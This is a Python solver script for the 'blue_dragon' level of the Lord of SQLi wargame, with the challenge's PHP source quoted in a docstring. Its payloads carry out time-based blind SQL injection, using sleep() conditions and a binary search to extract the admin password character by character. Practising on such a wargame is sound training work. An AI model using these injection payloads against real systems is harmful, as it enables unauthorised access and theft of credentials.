#!/usr/bin/env python3
import pickle
import los
from getpass import getpass
import time


def check_func(*args) -> bool:
    '''
    check time for request
    args[2]: time before request
    args[1]: time after request
    '''
    return args[2] - args[1] > 2


def main():
    '''
    Blue_dragon

    if(preg_match('/prob|_|\./i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\./i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id from prob_blue_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(preg_match('/\'|\\\/i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match('/\'|\\\/i', $_GET[pw])) exit("No Hack ~_~");
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_blue_dragon where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("blue_dragon");
    '''

    url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    final_response = ''
    while 'Clear!' not in final_response:

        payload = "' or id='admin' and if(length(pw)>%s,sleep(3),0)#"
        param = dict(pw=payload)
        len_of_key = los.find_key_len(url, param, check_func, cook)

        print(len_of_key)

        result = ''
        num_of_requests = 0
        for i in range(1, len_of_key + 1):
            payload = f"' or id='admin' and if(ord(mid(pw,{i},1))<%s,sleep(3),0)#"
            param = dict(pw=payload)
            left, num_requests = los.find_binary(url, param, check_func,
                                                 32, 127, cook)
            print(chr(left))
            result += chr(left)
            num_of_requests += num_requests

        print('num_of_requests:', num_of_requests)

        param = {'id': 'admin', 'pw': result}
        final_response = los.get_request(url, param, cook)

    print('Blue_dragon Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
